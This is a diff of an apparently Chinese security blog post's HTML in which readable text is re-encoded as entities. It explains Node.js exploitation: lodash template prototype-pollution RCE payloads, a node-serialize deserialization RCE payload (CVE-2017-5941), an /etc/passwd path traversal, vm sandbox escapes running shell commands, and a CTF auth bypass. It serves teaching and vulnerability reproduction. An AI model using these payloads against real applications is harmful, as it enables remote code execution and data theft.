-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
-<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
-<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p>
+<p>&#x5982;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x5230;options&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;sourceURL&#x662F;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x8D4B;&#x503C;&#x7684;&#xFF0C;options&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;sourceURL&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;sourceURL&#x9ED8;&#x8BA4;&#x4E5F;&#x662F;&#x4E3A;&#x7A7A;&#x3002;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&apos;sourceURL&apos;</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">&apos;//# sourceURL=&apos;</span> + options.sourceURL + <span class="hljs-string">&apos;\n&apos;</span> : <span class="hljs-string">&apos;&apos;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x7ED9;options&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#x52A0;&#x4E00;&#x4E2A;sourceURL&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63A7;&#x5236;sourceURL&#x7684;&#x503C;&#x3002;</p>
+<p>&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x9762;&#x770B;&#xFF0C;&#x6700;&#x540E;sourceURL&#x4F20;&#x9012;&#x5230;&#x4E86;Function&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x5F53;&#x4E2D;&#xFF1A;</p>
 <p><img src="https://i.loli.net/2020/02/11/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>通过构造chile_process.exec()就可以执行任意代码了。</p>
-<p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"sourceURL"</span>:<span class="string">"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>(这里直接用require会报错：ReferenceError: require is not defined</p>
-<p>p神给了一个更好的payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"sourceURL"</span>:<span class="string">"\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('id')&#125;\n//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&apos;return &apos;</span> + source)</span><br><span class="line">    .apply(<span class="hljs-literal">undefined</span>, importsValues);</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
+
+<p>&#x901A;&#x8FC7;&#x6784;&#x9020;chile_process.exec()&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p>
+<p>&#x6700;&#x7EC8;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;Payload&#x4F5C;&#x4E3A;&#x4F20;&#x9012;&#x7ED9;&#x4E3B;&#x9875;&#x9762;&#x7684;&#x7684;POST&#x6570;&#x636E;(windows&#x8C03;&#x7528;&#x8BA1;&#x7B97;&#x5668;)&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-string">&quot;__proto__&quot;</span>:{<span class="hljs-string">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;calc&apos;)//&quot;</span>}}</span><br></pre></td></tr></table></figure>
+
+<p>(&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x7528;require&#x4F1A;&#x62A5;&#x9519;&#xFF1A;ReferenceError: require is not defined</p>
+<p>p&#x795E;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x66F4;&#x597D;&#x7684;payload&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-string">&quot;__proto__&quot;</span>:{<span class="hljs-string">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nreturn e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;id&apos;)}\n//&quot;</span>}}</span><br></pre></td></tr></table></figure>
+
+<h2 id="node-serialize&#x53CD;&#x5E8F;&#x5217;&#x5316;RCE&#x6F0F;&#x6D1E;-CVE-2017-5941"><a href="#node-serialize&#x53CD;&#x5E8F;&#x5217;&#x5316;RCE&#x6F0F;&#x6D1E;-CVE-2017-5941" class="headerlink" title="node-serialize&#x53CD;&#x5E8F;&#x5217;&#x5316;RCE&#x6F0F;&#x6D1E;(CVE-2017-5941)"></a>node-serialize&#x53CD;&#x5E8F;&#x5217;&#x5316;RCE&#x6F0F;&#x6D1E;(CVE-2017-5941)</h2><p>&#x6F0F;&#x6D1E;&#x51FA;&#x73B0;&#x5728;node-serialize&#x6A21;&#x5757;0.0.4&#x7248;&#x672C;&#x5F53;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;<code>npm install node-serialize@0.0.4</code>&#x5B89;&#x88C5;&#x6A21;&#x5757;&#x3002;</p>
 <ul>
-<li>了解什么是IIFE：</li>
+<li>&#x4E86;&#x89E3;&#x4EC0;&#x4E48;&#x662F;IIFE&#xFF1A;</li>
 </ul>
-<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的  JavaScript 函数。</p>
-<p>IIFE一般写成下面的形式：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">IIFE&#xFF08;&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x8868;&#x8FBE;&#x5F0F;&#xFF09;</a>&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x5B9A;&#x4E49;&#x65F6;&#x5C31;&#x4F1A;&#x7ACB;&#x5373;&#x6267;&#x884C;&#x7684;  JavaScript &#x51FD;&#x6570;&#x3002;</p>
+<p>IIFE&#x4E00;&#x822C;&#x5199;&#x6210;&#x4E0B;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">/* code */</span> }());</span><br><span class="line"><span class="hljs-comment">// &#x6216;&#x8005;</span></span><br><span class="line">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">/* code */</span> })();</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><a href="mailto:`node-serialize@0.0.4" target="_blank" rel="noopener">`node-serialize@0.0.4</a>`漏洞点</li>
+<li><a href="mailto:`node-serialize@0.0.4" target="_blank" rel="noopener">`node-serialize@0.0.4</a>`&#x6F0F;&#x6D1E;&#x70B9;</li>
 </ul>
-<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
+<p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x4F4D;&#x4E8E;node_modules\node-serialize\lib\serialize.js&#x4E2D;&#xFF1A;</p>
 <p><img src="https://i.loli.net/2020/02/11/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p>
-<p>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p>
+<p>&#x5176;&#x4E2D;&#x7684;&#x5173;&#x952E;&#x5C31;&#x662F;&#xFF1A;<code>obj[key] = eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</code>&#x8FD9;&#x4E00;&#x884C;&#x8BED;&#x53E5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4F20;&#x9012;&#x7ED9;eval&#x7684;&#x53C2;&#x6570;&#x662F;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x88F9;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x6784;&#x9020;&#x4E00;&#x4E2A;<code>function(){}()</code>&#x51FD;&#x6570;&#xFF0C;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C31;&#x4F1A;&#x88AB;&#x5F53;&#x4E2D;IIFE&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x6267;&#x884C;&#x3002;&#x6765;&#x770B;&#x5982;&#x4F55;&#x6784;&#x9020;payload&#xFF1A;</p>
 <ul>
-<li>构造Payload</li>
+<li>&#x6784;&#x9020;Payload</li>
 </ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>
-<p>生成的Payload为：</p>
-<p><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr){console.log(stdout)});}&quot;}</code></p>
-<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
-<p><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr){console.log(stdout)});}()&quot;}</code></p>
-<p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p>
-<p>传递给unserialize(注意转义单引号)：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
-<p>执行命令成功，结果如图：</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;node-serialize&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">var</span> test = {</span><br><span class="line"> rce : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>).exec(<span class="hljs-string">&apos;ls /&apos;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)</span>{<span class="hljs-built_in">console</span>.log(stdout)});},</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&#x5E8F;&#x5217;&#x5316;&#x751F;&#x6210;&#x7684; Payload: \n&quot;</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>
+
+<p>&#x751F;&#x6210;&#x7684;Payload&#x4E3A;&#xFF1A;</p>
+<p><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr){console.log(stdout)});}&quot;}</code></p>
+<p>&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8BA9;&#x5176;&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;&#x751F;&#x6210;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x8BED;&#x53E5;&#x7684;&#x51FD;&#x6570;&#x540E;&#x9762;&#x518D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;<code>()</code>&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr){console.log(stdout)});}()&quot;}</code></p>
+<p>(&#x8FD9;&#x91CC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x5728;&#x5BF9;&#x8C61;&#x5185;&#x5B9A;&#x4E49;IIFE&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x5E8F;&#x5217;&#x5316;&#x5931;&#x8D25;)</p>
+<p>&#x4F20;&#x9012;&#x7ED9;unserialize(&#x6CE8;&#x610F;&#x8F6C;&#x4E49;&#x5355;&#x5F15;&#x53F7;)&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;node-serialize&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&apos;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;,function(error, stdout, stderr){console.log(stdout)});}()&quot;}&apos;</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<p>&#x6267;&#x884C;&#x547D;&#x4EE4;&#x6210;&#x529F;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x56FE;&#xFF1A;</p>
 <p><img src="https://i.loli.net/2020/02/11/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p>
-<h2 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>在vulhub上面可以直接下载到环境。</p>
-<p>漏洞影响的版本：</p>
+<h2 id="Node-js-&#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-CVE-2017-14849"><a href="#Node-js-&#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-CVE-2017-14849" class="headerlink" title="Node.js &#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;(CVE-2017-14849)"></a>Node.js &#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;(CVE-2017-14849)</h2><p>&#x5728;vulhub&#x4E0A;&#x9762;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0B;&#x8F7D;&#x5230;&#x73AF;&#x5883;&#x3002;</p>
+<p>&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x7684;&#x7248;&#x672C;&#xFF1A;</p>
 <ul>
 <li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
 <li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
 </ul>
-<p>运行漏洞环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/node/CVE-2017-14849/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p>
+<p>&#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x73AF;&#x5883;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/node/CVE-2017-14849/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>&#x7528;Burpsuite&#x83B7;&#x53D6;&#x5730;&#x5740;&#xFF1A;<code>/static/../../../a/../../../../etc/passwd</code> &#x5373;&#x53EF;&#x4E0B;&#x8F7D;&#x5F97;&#x5230;<code>/etc/passwd</code>&#x6587;&#x4EF6;</p>
 <p><img src="https://i.loli.net/2020/02/11/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p>
-<p>具体分析可见：<a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener">Node.js CVE-2017-14849 漏洞分析</a></p>
-<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p>
-<p>逃逸例子：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`this.constructor.constructor('return this.process.env')()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
-<p>执行之后可以获取到主程序环境中的环境变量</p>
-<p>上面例子的代码等价于如下代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">"this.constructor.constructor('return this.process.env')()"</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
-<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
-<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
-<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
-<p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p>
-<p>具体分析可参考：<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCE复现分析</a></p>
-<h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>在javascript中有几个特殊的字符需要记录一下</p>
-<p>对于toUpperCase():</p>
-<pre><code>字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;
-</code></pre><p>对于toLowerCase():</p>
-<pre><code>字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)
-</code></pre><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
-<p><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></p>
-<p>题目部分源码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p>
-<p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p>
-<p>题目中默认的管理员用户名为：hacktm</p>
-<p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p>
-<p>题目完整Writeup：</p>
-<h2 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h2><p>最近才刚开始学习Node.js，打算趁寒假这段时间把常见的几个漏洞总结一下。如果文章中出现了错误，还希望师傅们能够直接指出来，十分感谢！</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></li>
-<li><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></li>
-<li><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></li>
+<p>&#x5177;&#x4F53;&#x5206;&#x6790;&#x53EF;&#x89C1;&#xFF1A;<a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener">Node.js CVE-2017-14849 &#x6F0F;&#x6D1E;&#x5206;&#x6790;</a></p>
+<h2 id="vm&#x6C99;&#x7BB1;&#x9003;&#x9038;"><a href="#vm&#x6C99;&#x7BB1;&#x9003;&#x9038;" class="headerlink" title="vm&#x6C99;&#x7BB1;&#x9003;&#x9038;"></a>vm&#x6C99;&#x7BB1;&#x9003;&#x9038;</h2><p>vm&#x662F;&#x7528;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x6C99;&#x7BB1;&#x73AF;&#x5883;&#xFF0C;&#x53EF;&#x4EE5;&#x5B89;&#x5168;&#x7684;&#x6267;&#x884C;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x4EE3;&#x7801;&#x800C;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x4E3B;&#x7A0B;&#x5E8F;&#x3002;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x8BED;&#x53E5;&#x6765;&#x8FDB;&#x884C;&#x9003;&#x9038;&#xFF1A;</p>
+<p>&#x9003;&#x9038;&#x4F8B;&#x5B50;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> env = vm.runInNewContext(<span class="hljs-string">`this.constructor.constructor(&apos;return this.process.env&apos;)()`</span>);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>&#x6267;&#x884C;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x4E3B;&#x7A0B;&#x5E8F;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;</p>
+<p>&#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x7684;&#x4EE3;&#x7801;&#x7B49;&#x4EF7;&#x4E8E;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
